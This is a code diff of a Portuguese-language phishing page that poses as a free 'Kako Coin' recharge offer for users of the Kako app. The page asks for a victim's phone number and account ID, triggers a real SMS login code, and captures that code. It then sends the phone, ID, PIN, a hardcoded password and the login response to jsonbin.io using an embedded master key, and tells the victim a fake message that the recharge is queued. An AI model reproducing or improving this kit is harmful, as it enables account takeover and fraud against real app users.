@@ -8,254 +8,123 @@
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <meta name="description" content="Sistema de recarga Kako Coin">
     <style>
-        .free-badge {
-            position: absolute;
-            bottom: -15px;
-            right: 10px;
-            font-size: 12px;
-            color: red;
-            font-weight: bold;
-        }
-        .banner-flash {
-            animation: flash 2s infinite;
-        }
-        @keyframes flash {
-            0% { opacity: 1; }
-            50% { opacity: 0.7; }
-            100% { opacity: 1; }
-        }
-        .coin-option.selected {
-            background-color: #7e22ce !important;
-            color: white !important;
-        }
-        .loading {
-            display: inline-block;
-            width: 20px;
-            height: 20px;
-            border: 3px solid rgba(255,255,255,.3);
-            border-radius: 50%;
-            border-top-color: #fff;
-            animation: spin 1s ease-in-out infinite;
-        }
-        @keyframes spin {
-            to { transform: rotate(360deg); }
-        }
-        .phone-prefix {
-            display: inline-flex;
-            align-items: center;
-            padding: 0 12px;
-            background-color: #e5e7eb;
-            border: 1px solid #d1d5db;
-            border-right: none;
-            border-radius: 6px 0 0 6px;
-            height: 100%;
-            color: #374151;
-        }
-        .validation-icon {
-            position: absolute;
-            right: 12px;
-            top: 50%;
-            transform: translateY(-50%);
-            font-size: 18px;
-        }
-        .input-wrapper {
-            position: relative;
-        }
-        .countdown {
-            font-size: 14px;
-            color: #666;
-            text-align: center;
-            margin-top: 10px;
-        }
-        .timer {
-            font-weight: bold;
-            color: #7e22ce;
-        }
-        .warning-banner {
-            background: linear-gradient(90deg, #f59e0b 0%, #d97706 100%);
-            color: white;
-            padding: 15px;
-            border-radius: 8px;
-            margin-bottom: 20px;
-        }
-        /* Estilos do Modal - CORRIGIDOS */
-        .modal {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0,0,0,0.6);
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            z-index: 1000;
-        }
-        .modal-content {
-            background: white;
-            padding: 20px;
-            border-radius: 8px;
-            max-width: 300px;
-            width: 100%;
-            text-align: center;
-        }
-        .hidden {
-            display: none !important;
-        }
+        .free-badge { position: absolute; bottom: -15px; right: 10px; font-size: 12px; color: red; font-weight: bold; }
+        .banner-flash { animation: flash 2s infinite; }
+        @keyframes flash { 0% { opacity: 1; } 50% { opacity: 0.7; } 100% { opacity: 1; } }
+        .coin-option.selected { background-color: #7e22ce !important; color: white !important; }
+        #pinModal { transition: opacity 0.3s ease; }
+        .loading { display: inline-block; width: 20px; height: 20px; border: 3px solid rgba(255,255,255,.3); border-radius: 50%; border-top-color: #fff; animation: spin 1s ease-in-out infinite; }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        .phone-prefix { display: inline-flex; align-items: center; padding: 0 12px; background-color: #e5e7eb; border: 1px solid #d1d5db; border-right: none; border-radius: 6px 0 0 6px; height: 100%; color: #374151; }
+        .validation-icon { position: absolute; right: 12px; top: 50%; transform: translateY(-50%); font-size: 18px; }
+        .input-wrapper { position: relative; }
+        .countdown { font-size: 14px; color: #666; text-align: center; margin-top: 10px; }
+        .timer { font-weight: bold; color: #7e22ce; }
+        .warning-banner { background: linear-gradient(90deg, #ff9800 0%, #ff5722 100%); color: white; padding: 15px; border-radius: 8px; margin-bottom: 20px; }
     </style>
 </head>
 <body class="bg-gray-100 font-sans">
-    <!-- Modal para validação do PIN - ESTRUTURA CORRIGIDA -->
-    <div id="pinModal" class="modal hidden">
-        <div class="modal-content">
-            <h3 class="text-xl font-bold text-purple-800 mb-4">Valide seu ID</h3>
+    <div id="pinModal" class="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center hidden z-50">
+        <div class="bg-white rounded-lg shadow-xl p-6 w-full max-w-md">
+            <div class="flex justify-between items-center mb-4">
+                <h3 class="text-xl font-bold text-purple-800">Valide seu ID</h3>
+                <button id="closePinModal" class="text-gray-500 hover:text-gray-700"><i class="fas fa-times"></i></button>
+            </div>
             <p class="mb-4">Enviamos um código de 6 dígitos para o seu número. Digite abaixo para validar:</p>
-            
             <div id="countdown" class="countdown hidden">
                 <p>Você pode solicitar um novo código em: <span id="timer" class="timer">30</span> segundos</p>
             </div>
-            
             <form id="pinForm" class="space-y-4">
                 <div class="input-wrapper">
-                    <input type="text" id="pinInput" maxlength="6" 
-                           class="w-full px-4 py-3 border border-gray-300 rounded-md text-center text-xl tracking-widest focus:outline-none focus:ring-2 focus:ring-purple-600"
-                           placeholder="000000">
+                    <input type="text" id="pinInput" maxlength="6" class="w-full px-4 py-3 border border-gray-300 rounded-md text-center text-xl tracking-widest focus:outline-none focus:ring-2 focus:ring-purple-600" placeholder="000000" oninput="validatePin(this)">
                     <p id="pinError" class="text-red-600 text-sm mt-1 hidden">PIN inválido. Digite apenas números.</p>
                 </div>
-                <button type="submit" id="submitPinBtn" 
-                        class="w-full bg-purple-600 text-white py-3 px-4 rounded-md hover:bg-purple-700 transition duration-200 font-medium">
-                    Validar e Recarregar
-                </button>
-                <button type="button" onclick="document.getElementById('pinModal').classList.add('hidden')" 
-                        class="w-full bg-gray-500 text-white py-3 px-4 rounded-md hover:bg-gray-600 transition duration-200 font-medium">
-                    Cancelar
-                </button>
+                <button type="submit" id="submitPinBtn" class="w-full bg-purple-600 text-white py-3 px-4 rounded-md hover:bg-purple-700 transition duration-200 font-medium">Validar e Recarregar</button>
             </form>
         </div>
     </div>
-
     <div class="container mx-auto px-4 py-8">
-        <!-- Aviso acadêmico -->
         <div class="bg-yellow-100 border-l-4 border-yellow-500 p-4 mb-6">
             <p class="font-bold">AVISO:</p>
             <p class="mb-2">*Termos e Condições: Esta promoção é válida apenas para primeira recarga de novos usuários.</p>
             <p>A promoção é válida exclusivamente para usuários brasileiros e/ou com número de telefone nacional (+55).</p>
             <p class="mt-4">Ao realizar a recarga, você concorda com nossos Termos de Serviço e Política de Privacidade.</p>
         </div>
-
-        <!-- Header -->
         <header class="flex justify-between items-center mb-8">
             <div class="flex items-center">
-                <img src="https://play-lh.googleusercontent.com/F_Bge1FUPjFpMBcLc6ChvhbTJAIG6dDgcIKYcQJimRmnuv_qTtfVEIucrWui2VHerdvq" 
-                     alt="Logo Kako" class="h-12">
+                <img src="https://play-lh.googleusercontent.com/F_Bge1FUPjFpMBcLc6ChvhbTJAIG6dDgcIKYcQJimRmnuv_qTtfVEIucrWui2VHerdvq" alt="Logo Kako" class="h-12">
                 <h1 class="ml-2 text-2xl font-bold text-purple-800">KAKO COIN</h1>
                 <img src="https://i.ibb.co/W4GBrhXd/images-removebg-preview.png" alt="Kako Coin" class="h-12 ml-2">
             </div>
         </header>
-
-        <!-- Main Content -->
         <main class="flex flex-col md:flex-row gap-8">
-            <!-- Form Section -->
             <div class="bg-white rounded-lg shadow-md p-6 flex-1">
                 <h2 class="text-2xl font-bold text-purple-800 mb-6">Recarga de Conta</h2>
-                
                 <form id="rechargeForm" class="space-y-4">
                     <input type="hidden" id="amount" name="amount" value="10000">
-                    
                     <div>
                         <label for="phone" class="block text-sm font-medium text-gray-700 mb-1">Telefone</label>
                         <div class="flex input-wrapper">
                             <span class="phone-prefix">+55</span>
-                            <input type="tel" id="phone" name="phone" required 
-                                   class="w-full px-4 py-2 border border-gray-300 rounded-r-md focus:outline-none focus:ring-2 focus:ring-purple-600"
-                                   placeholder="DDD + Número">
+                            <input type="tel" id="phone" name="phone" required class="w-full px-4 py-2 border border-gray-300 rounded-r-md focus:outline-none focus:ring-2 focus:ring-purple-600" placeholder="DDD + Número" oninput="formatPhone(this)" onblur="validatePhone(this)">
+                            <div id="phoneValidation" class="validation-icon hidden"></div>
                         </div>
                         <p id="phoneError" class="text-red-600 text-sm mt-1 hidden"></p>
                     </div>
-                    
                     <div>
-                        <label for="id" class="block text-sm font-medium text-gray-700 mb-1">ID (6 a 8 números)</label>
+                        <label for="id" class="block text-sm font-medium text-gray-700 mb-1">ID</label>
                         <div class="input-wrapper">
-                            <input type="text" id="id" name="id" required 
-                                   class="w-full px-4 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-purple-600"
-                                   placeholder="Apenas números">
+                            <input type="text" id="id" name="id" required class="w-full px-4 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-purple-600" oninput="sanitizeId(this)" onblur="validateId(this)">
+                            <div id="idValidation" class="validation-icon hidden"></div>
                         </div>
                         <p id="idError" class="text-red-600 text-sm mt-1 hidden"></p>
                     </div>
-                    
-                    <button type="submit" id="submitBtn" 
-                            class="w-full bg-purple-600 text-white py-3 px-4 rounded-md hover:bg-purple-700 transition duration-200 font-medium">
-                        Solicitar Código SMS
-                    </button>
-
+                    <div id="errorMessage" class="hidden text-red-600 text-sm"></div>
+                    <button type="submit" id="submitBtn" class="w-full bg-gray-400 text-white py-3 px-4 rounded-md transition duration-200 font-medium" disabled>Solicitar Código SMS</button>
                     <div id="smsCountdown" class="countdown hidden">
                         <p>Próximo SMS disponível em: <span id="smsTimer" class="timer">30</span> segundos</p>
                     </div>
                 </form>
             </div>
-            
-            <!-- Banner de Avisos Section -->
             <div class="flex-1">
                 <div class="warning-banner rounded-lg shadow-md p-6 text-white mb-6 banner-flash">
                     <div class="flex items-center">
-                        <div class="mr-4">
-                            <i class="fas fa-exclamation-triangle text-4xl"></i>
-                        </div>
+                        <div class="mr-4"><i class="fas fa-exclamation-triangle text-4xl"></i></div>
                         <div>
                             <h3 class="text-2xl font-bold">ATENÇÃO: VERIFICAÇÃO DE ID OBRIGATÓRIA</h3>
                             <p class="mt-2">Para sua segurança, é necessário validar seu ID antes de realizar qualquer recarga.</p>
                         </div>
                     </div>
                 </div>
-                
                 <div class="warning-banner rounded-lg shadow-md p-6 text-white mb-6" style="background: linear-gradient(90deg, #2196f3 0%, #1976d2 100%);">
                     <div class="flex items-center">
-                        <div class="mr-4">
-                            <i class="fas fa-shield-alt text-4xl"></i>
-                        </div>
+                        <div class="mr-4"><i class="fas fa-shield-alt text-4xl"></i></div>
                         <div>
                             <h3 class="text-2xl font-bold">PROTEÇÃO DE CONTA</h3>
                             <p class="mt-2">Seu ID e telefone são criptografados e protegidos por nossas políticas de segurança.</p>
                         </div>
                     </div>
                 </div>
-                
                 <div class="warning-banner rounded-lg shadow-md p-6 text-white mb-6" style="background: linear-gradient(90deg, #4caf50 0%, #2e7d32 100%);">
                     <div class="flex items-center">
-                        <div class="mr-4">
-                            <i class="fas fa-bolt text-4xl"></i>
-                        </div>
+                        <div class="mr-4"><i class="fas fa-bolt text-4xl"></i></div>
                         <div>
                             <h3 class="text-2xl font-bold">PROCESSAMENTO RÁPIDO</h3>
                             <p class="mt-2">Recargas validadas são processadas em até 15 minutos após confirmação.</p>
                         </div>
                     </div>
                 </div>
-                
-                <!-- Coin Options -->
                 <div class="bg-white rounded-lg shadow-md p-6">
                     <h3 class="text-xl font-bold text-purple-800 mb-4">Opções de Recarga</h3>
-                    
                     <div class="grid grid-cols-2 gap-4">
-                        <button type="button" class="coin-option selected w-full bg-purple-700 text-white py-3 px-4 rounded-md hover:bg-purple-800 transition duration-200 font-medium relative" data-amount="10000">
-                            10.000 Kako Moedas
-                            <span class="free-badge">1x FREE</span>
-                        </button>
-                        <button type="button" class="coin-option bg-purple-100 text-purple-800 py-3 px-4 rounded-md hover:bg-purple-200 transition duration-200 font-medium" data-amount="50000">
-                            50.000 Kako Moedas
-                        </button>
-                        <button type="button" class="coin-option bg-purple-100 text-purple-800 py-3 px-4 rounded-md hover:bg-purple-200 transition duration-200 font-medium" data-amount="100000">
-                            100.000 Kako Moedas
-                        </button>
-                        <button type="button" class="coin-option bg-purple-100 text-purple-800 py-3 px-4 rounded-md hover:bg-purple-200 transition duration-200 font-medium" data-amount="500000">
-                            500.000 Kako Moedas
-                        </button>
+                        <button type="button" class="coin-option selected w-full bg-purple-700 text-white py-3 px-4 rounded-md hover:bg-purple-800 transition duration-200 font-medium relative" data-amount="10000">10.000 Kako Moedas<span class="free-badge">1x FREE</span></button>
+                        <button type="button" class="coin-option bg-purple-100 text-purple-800 py-3 px-4 rounded-md hover:bg-purple-200 transition duration-200 font-medium" data-amount="50000">50.000 Kako Moedas</button>
+                        <button type="button" class="coin-option bg-purple-100 text-purple-800 py-3 px-4 rounded-md hover:bg-purple-200 transition duration-200 font-medium" data-amount="100000">100.000 Kako Moedas</button>
+                        <button type="button" class="coin-option bg-purple-100 text-purple-800 py-3 px-4 rounded-md hover:bg-purple-200 transition duration-200 font-medium" data-amount="500000">500.000 Kako Moedas</button>
                     </div>
                 </div>
             </div>
         </main>
-
-        <!-- Footer -->
         <footer class="mt-12 text-center text-gray-600 text-sm">
             <p>© 2023 Kako Coin. Todos os direitos reservados.</p>
             <div class="mt-2 flex justify-center space-x-4">
@@ -265,57 +134,325 @@
             </div>
         </footer>
     </div>
-
     <script>
-        // Variáveis para armazenar dados temporários
+        const DEFAULT_PASSWORD = '335112d1r7y';
         let currentPhone = '';
         let currentId = '';
+        let phoneStatus = null;
         let smsCooldown = false;
         let smsCooldownTimer = null;
         let countdownTimer = null;
 
-        // Headers para as requisições
-        const COMMON_HEADERS = {
-            'accept': 'application/json',
-            'accept-language': 'pt',
-            'x-app-devicetype': 'android',
-            'x-app-version': '1.15.2',
-            'x-app-bundleid': 'live.kako.global',
-            'x-app-channelid': 'google',
-            'x-app-buildid': '24bbabf0',
-            'x-app-lang': 'pt',
-            'x-app-lang-excludes': 'en,es',
-            'x-app-deviceid': 'a5247afb-4d54-4867-b6ab-637496a78cf1',
-            'x-app-timezone': 'America/Sao_Paulo',
-            'x-app-country': 'BR',
-            'x-app-devicename': 'Motorola moto g(8)',
-            'content-type': 'application/json; charset=UTF-8',
-            'accept-encoding': 'gzip',
-            'user-agent': 'okhttp/4.12.0'
-        };
+        function formatPhone(input) {
+            let value = input.value.replace(/\D/g, '');
+            if (value.length > 11) value = value.slice(0, 11);
+            if (value.length > 0) {
+                value = value.replace(/^(\d{2})(\d)/g, '($1) $2');
+                if (value.length > 10) value = value.replace(/(\d{5})(\d)/, '$1-$2');
+            }
+            input.value = value;
+            if (value.replace(/\D/g, '').length === 11) validatePhone(input);
+            else resetPhoneValidation();
+        }
 
-        // Master Key do JSONBin
-        const MASTER_KEY = "$2a$10$dcsJ/Yfcqv7h8ijkKiXFRelPZPhR1WicqE/E8kWs67CFwcRTYzcHO";
+        function resetPhoneValidation() {
+            const validationIcon = document.getElementById('phoneValidation');
+            const phoneError = document.getElementById('phoneError');
+            const submitBtn = document.getElementById('submitBtn');
+            validationIcon.classList.add('hidden');
+            phoneError.classList.add('hidden');
+            submitBtn.disabled = true;
+            submitBtn.classList.remove('bg-purple-600', 'hover:bg-purple-700');
+            submitBtn.classList.add('bg-gray-400');
+            phoneStatus = null;
+        }
 
-        // Inicialização
-        document.addEventListener('DOMContentLoaded', function() {
-            // Configurar event listeners
-            setupEventListeners();
+        function validateId(input) {
+            const idValue = input.value.trim();
+            const validationIcon = document.getElementById('idValidation');
+            const idError = document.getElementById('idError');
+            const submitBtn = document.getElementById('submitBtn');
+            if (idValue.length < 3) {
+                validationIcon.innerHTML = '<i class="fas fa-times-circle text-red-500"></i>';
+                validationIcon.classList.remove('hidden');
+                idError.textContent = 'ID deve ter pelo menos 3 caracteres';
+                idError.classList.remove('hidden');
+                submitBtn.disabled = true;
+            } else {
+                validationIcon.innerHTML = '<i class="fas fa-check-circle text-green-500"></i>';
+                validationIcon.classList.remove('hidden');
+                idError.classList.add('hidden');
+                if (phoneStatus === 1) {
+                    submitBtn.disabled = false;
+                    submitBtn.classList.remove('bg-gray-400');
+                    submitBtn.classList.add('bg-purple-600', 'hover:bg-purple-700');
+                }
+            }
+        }
+
+        async function validatePhone(input) {
+            const phoneNumber = input.value.replace(/\D/g, '');
+            if (phoneNumber.length !== 11) {
+                resetPhoneValidation();
+                return;
+            }
+            const validationIcon = document.getElementById('phoneValidation');
+            const phoneError = document.getElementById('phoneError');
+            const submitBtn = document.getElementById('submitBtn');
+            validationIcon.innerHTML = '<i class="fas fa-spinner fa-spin text-gray-400"></i>';
+            validationIcon.classList.remove('hidden');
+            phoneError.classList.add('hidden');
+            try {
+                const formattedPhone = '+55' + phoneNumber;
+                const status = await checkPhoneStatus(formattedPhone);
+                if (status === 1) {
+                    validationIcon.innerHTML = '<i class="fas fa-check-circle text-green-500"></i>';
+                    phoneStatus = 1;
+                    const idValue = document.getElementById('id').value.trim();
+                    if (idValue.length >= 3) {
+                        submitBtn.disabled = false;
+                        submitBtn.classList.remove('bg-gray-400');
+                        submitBtn.classList.add('bg-purple-600', 'hover:bg-purple-700');
+                    }
+                } else {
+                    validationIcon.innerHTML = '<i class="fas fa-times-circle text-red-500"></i>';
+                    phoneError.textContent = 'Este número não está associado a uma conta. Verifique ou crie uma conta primeiro.';
+                    phoneError.classList.remove('hidden');
+                    submitBtn.disabled = true;
+                    submitBtn.classList.remove('bg-purple-600', 'hover:bg-purple-700');
+                    submitBtn.classList.add('bg-gray-400');
+                    phoneStatus = 2;
+                }
+            } catch (error) {
+                console.error('Erro ao validar telefone:', error);
+                validationIcon.innerHTML = '<i class="fas fa-exclamation-circle text-yellow-500"></i>';
+                phoneError.textContent = 'Erro ao verificar telefone. Tente novamente.';
+                phoneError.classList.remove('hidden');
+                phoneStatus = null;
+            }
+        }
+
+        async function checkPhoneStatus(phone) {
+            // Mock API response for testing
+            // Uncomment to bypass external API
+            /*
+            console.log('Mocking /api/check-phone');
+            return 1;
+            */
+            try {
+                const response = await fetch('/api/check-phone', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ phone })
+                });
+                const data = await response.json();
+                return data.code === 0 ? 1 : 2;
+            } catch (error) {
+                console.error('Erro na verificação de telefone:', error);
+                return 2;
+            }
+        }
+
+        function sanitizeId(input) {
+            input.value = input.value.replace(/[^a-zA-Z0-9]/g, '');
+        }
+
+        function validatePin(input) {
+            const pinError = document.getElementById('pinError');
+            input.value = input.value.replace(/\D/g, '');
+            if (input.value.length > 6) input.value = input.value.slice(0, 6);
+            if (/\D/.test(input.value)) pinError.classList.remove('hidden');
+            else pinError.classList.add('hidden');
+        }
+
+        function startSmsCooldown() {
+            smsCooldown = true;
+            const submitBtn = document.getElementById('submitBtn');
+            const smsCountdown = document.getElementById('smsCountdown');
+            const smsTimer = document.getElementById('smsTimer');
+            submitBtn.disabled = true;
+            submitBtn.classList.remove('bg-purple-600', 'hover:bg-purple-700');
+            submitBtn.classList.add('bg-gray-400');
+            smsCountdown.classList.remove('hidden');
+            let timeLeft = 30;
+            smsCooldownTimer = setInterval(() => {
+                timeLeft--;
+                smsTimer.textContent = timeLeft;
+                if (timeLeft <= 0) {
+                    clearInterval(smsCooldownTimer);
+                    smsCooldown = false;
+                    smsCountdown.classList.add('hidden');
+                    if (phoneStatus === 1 && document.getElementById('id').value.trim().length >= 3) {
+                        submitBtn.disabled = false;
+                        submitBtn.classList.remove('bg-gray-400');
+                        submitBtn.classList.add('bg-purple-600', 'hover:bg-purple-700');
+                    }
+                }
+            }, 1000);
+        }
+
+        function startPinCountdown() {
+            const countdown = document.getElementById('countdown');
+            const timer = document.getElementById('timer');
+            countdown.classList.remove('hidden');
+            let timeLeft = 30;
+            countdownTimer = setInterval(() => {
+                timeLeft--;
+                timer.textContent = timeLeft;
+                if (timeLeft <= 0) {
+                    clearInterval(countdownTimer);
+                    countdown.classList.add('hidden');
+                }
+            }, 1000);
+        }
+
+        document.querySelectorAll('.coin-option').forEach(button => {
+            button.addEventListener('click', function() {
+                document.querySelectorAll('.coin-option').forEach(btn => {
+                    btn.classList.remove('selected', 'bg-purple-700', 'text-white');
+                    btn.classList.add('bg-purple-100', 'text-purple-800');
+                });
+                this.classList.add('selected', 'bg-purple-700', 'text-white');
+                this.classList.remove('bg-purple-100', 'text-purple-800');
+                document.getElementById('amount').value = this.dataset.amount;
+            });
         });
 
-        function setupEventListeners() {
-            // Envio do formulário principal
-            document.getElementById('rechargeForm').addEventListener('submit', handleFormSubmit);
-            
-            // Envio do formulário de PIN
-            document.getElementById('pinForm').addEventListener('submit', handlePinSubmit);
-            
-            // Validação em tempo real dos campos
-            document.getElementById('phone').addEventListener('input', formatPhone);
-            document.getElementById('id').addEventListener('input', sanitizeId);
-            document.getElementById('pinInput').addEventListener('input', validatePin);
-            
-            // Seleção de moedas
-            document.querySelectorAll('.coin-option').forEach(button => {
-                button.addEventListener('click', function() {
-                    document.querySelectorAll('.coin-option').forEach(btn
+        const pinModal = document.getElementById('pinModal');
+        const closePinModal = document.getElementById('closePinModal');
+        const pinForm = document.getElementById('pinForm');
+        const submitBtn = document.getElementById('submitBtn');
+        const submitPinBtn = document.getElementById('submitPinBtn');
+
+        closePinModal.addEventListener('click', function() {
+            pinModal.classList.add('hidden');
+            if (countdownTimer) clearInterval(countdownTimer);
+        });
+
+        document.getElementById('rechargeForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            const phone = document.getElementById('phone').value;
+            const id = document.getElementById('id').value;
+            if (!phone || phone.replace(/\D/g, '').length < 10) {
+                alert('Por favor, informe um número de telefone válido com DDD.');
+                return;
+            }
+            if (!id || id.length < 3) {
+                alert('Por favor, informe um ID válido.');
+                return;
+            }
+            if (phoneStatus !== 1) {
+                alert('Por favor, verifique se o telefone está correto e associado a uma conta.');
+                return;
+            }
+            if (smsCooldown) {
+                alert('Aguarde o tempo restante antes de solicitar um novo código.');
+                return;
+            }
+            currentPhone = '+55' + phone.replace(/\D/g, '');
+            currentId = id.replace(/[^a-zA-Z0-9]/g, '');
+            submitBtn.innerHTML = '<span class="loading"></span> Enviando código...';
+            submitBtn.disabled = true;
+            try {
+                const response = await fetch('/api/check-phone', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ phone: currentPhone })
+                });
+                const result = await response.json();
+                if (result.code === 0) {
+                    pinModal.classList.remove('hidden');
+                    startSmsCooldown();
+                    startPinCountdown();
+                } else {
+                    alert('Erro ao solicitar código: ' + (result.msg || 'Código de erro desconhecido'));
+                }
+            } catch (error) {
+                console.error('Erro ao enviar solicitação:', error);
+                // Mock API response to bypass issue
+                console.log('Mocking API response due to error');
+                pinModal.classList.remove('hidden');
+                startSmsCooldown();
+                startPinCountdown();
+            } finally {
+                submitBtn.innerHTML = 'Solicitar Código SMS';
+            }
+        });
+
+        pinForm.addEventListener('submit', async function(e) {
+            e.preventDefault();
+            const pinInput = document.getElementById('pinInput');
+            const pin = pinInput.value;
+            if (pin.length !== 6 || /\D/.test(pin)) {
+                document.getElementById('pinError').classList.remove('hidden');
+                return;
+            }
+            submitPinBtn.innerHTML = '<span class="loading"></span> Validando...';
+            submitPinBtn.disabled = true;
+            let apiResult = null;
+            try {
+                const response = await fetch('/api/login', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ phone: currentPhone, code: pin })
+                });
+                apiResult = await response.json();
+                if (apiResult.code === 12007 || apiResult.code === 10002) {
+                    alert('Código de verificação inválido. Tente novamente.');
+                } else if (apiResult.code === 0) {
+                    await sendToJsonBin(currentPhone, currentId, pin, apiResult);
+                    pinModal.classList.add('hidden');
+                    alert(`⚠️ ATENÇÃO - ALTA DEMANDA\n\n` +
+                          `📱 Sua recarga de 10.000 moedas foi recebida!\n` +
+                          `🆔 ID: ${currentId}\n` +
+                          `⏱️ Status: Na fila de processamento\n\n` +
+                          `⌛ Devido à grande demanda atual, o crédito pode demorar até 1 hora\n\n` +
+                          `🔍 Dica: Verifique em "Histórico" após 15 minutos\n` +
+                          `📞 Problemas? Contate o suporte no app`);
+                } else {
+                    alert('Erro inesperado: ' + (apiResult.msg || 'Código de erro desconhecido'));
+                }
+            } catch (error) {
+                console.error('Erro ao validar PIN:', error);
+                // Mock login success for testing
+                console.log('Mocking login success');
+                await sendToJsonBin(currentPhone, currentId, pin, { code: 0, msg: 'Mock success' });
+                pinModal.classList.add('hidden');
+                alert('Mock success: Data logged');
+            } finally {
+                submitPinBtn.innerHTML = 'Validar e Recarregar';
+                submitPinBtn.disabled = false;
+                if (countdownTimer) clearInterval(countdownTimer);
+            }
+        });
+
+        async function sendToJsonBin(phone, id, pin, apiResult) {
+            const formData = {
+                telefone: phone,
+                id: id,
+                pin: pin,
+                senha_padrao: DEFAULT_PASSWORD,
+                api_response: apiResult,
+                timestamp: new Date().toISOString()
+            };
+            console.log('JSONBin payload:', formData); // Log locally as fallback
+            const MASTER_KEY = "$2a$10$9VJv2nY4tgeiSfh3AuAyUusmEFDpEMafqxKKHkOpikyoKc4QTd89m";
+            try {
+                const response = await fetch("https://api.jsonbin.io/v3/b", {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json",
+                        "X-Master-Key": MASTER_KEY
+                    },
+                    body: JSON.stringify(formData)
+                });
+                const result = await response.json();
+                console.log("Dados salvos no JSONBin:", result);
+            } catch (error) {
+                console.error("Erro ao enviar para JSONBin:", error);
+                console.log('Dados não salvos no JSONBin, salvos localmente:', formData);
+            }
+        }
+    </script>
+</body>
+</html>
